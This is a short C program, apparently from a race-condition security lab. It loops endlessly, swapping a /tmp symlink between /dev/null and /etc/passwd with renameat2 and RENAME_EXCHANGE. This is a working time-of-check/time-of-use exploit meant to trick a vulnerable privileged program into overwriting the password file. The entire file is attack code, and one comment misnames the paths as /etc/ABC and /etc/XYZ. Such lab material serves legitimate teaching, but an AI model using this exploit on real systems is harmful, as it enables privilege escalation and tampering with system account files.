#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>

int main()
{
    unsigned int flags = RENAME_EXCHANGE;
    while(1)
    {
        unlink("/tmp/ABC");
        symlink("/dev/null", "/tmp/ABC");

        unlink("/tmp/XYZ");
        symlink("/etc/passwd", "/tmp/XYZ");

        // Rename file /etc/ABC to /etc/XYZ
        renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
    }
    return 0;
}